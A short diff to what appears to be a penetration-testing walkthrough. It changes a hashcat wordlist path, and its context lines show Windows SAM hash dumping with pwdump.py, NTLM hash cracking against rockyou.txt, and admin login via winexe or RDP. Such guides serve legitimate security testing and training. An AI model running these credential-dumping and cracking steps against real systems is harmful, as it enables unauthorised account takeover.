@@ -56,7 +56,7 @@ python3 creddump7/pwdump.py SYSTEM SAM
 Crack the admin NTLM hash using hashcat:
 
 ```
-hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 --force <hash> $WORDLIST_PATH/rockyou.txt
 ```
 
 You can use the cracked password to log in as the admin using winexe or RDP.
